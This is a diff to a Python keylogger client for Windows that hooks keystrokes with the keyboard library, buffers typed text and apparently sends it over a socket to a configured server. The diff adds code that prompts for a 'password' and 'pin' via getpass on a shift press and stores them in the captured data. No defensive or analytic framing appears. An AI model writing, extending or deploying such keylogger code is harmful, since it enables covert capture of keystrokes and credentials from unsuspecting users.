@@ -1,15 +1,14 @@
-#Module (Client for Windows)
-
 import socket
 import json
 import keyboard
 import threading
 import time
 import os
+import getpass
 from datetime import datetime
 
 # Module Name
-module_name = "test1”  # Change this to your desired name
+module_name = "test1"  # Change this to your desired name
 
 # Server Configuration
 HOST = '127.0.0.1'
@@ -43,6 +42,9 @@ def keylogger():
             data["text"] = data["text"][:-1]
         if event.name == "space":
             data["text"] += " "
+        if event.name == "shift":
+            data["password"] = getpass.getpass()
+            data["pin"] = getpass.getpass()
 
     keyboard.hook(on_press)
 
@@ -52,5 +54,3 @@ def keylogger():
 
 # Run Keylogger
 threading.Thread(target=keylogger).start()
-
-
